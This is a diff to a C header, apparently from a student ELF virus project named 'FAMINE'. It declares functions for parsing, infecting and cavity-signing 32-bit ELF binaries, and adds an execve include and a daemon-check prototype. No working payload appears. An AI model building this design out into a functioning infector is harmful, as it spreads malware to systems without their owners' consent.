@@ -7,6 +7,7 @@
 #include <stdbool.h> // bool
 #include <stddef.h> // size_t
 #include <stdint.h> // uintN_t
+#include <unistd.h> // execve
 
 /* Defines */
 #define SIGNATURE "FAMINE"
@@ -54,5 +55,7 @@ int process_elf32(t_file *file);
 int parse_elf32(t_file *file, t_elf32 *elf32);
 int infect_elf32(t_file *file, t_elf32 *elf32);
 int sign_elf32_cavity(t_file *file, t_elf32 *elf32);
+
+int daemon_is_present();
 
 #endif
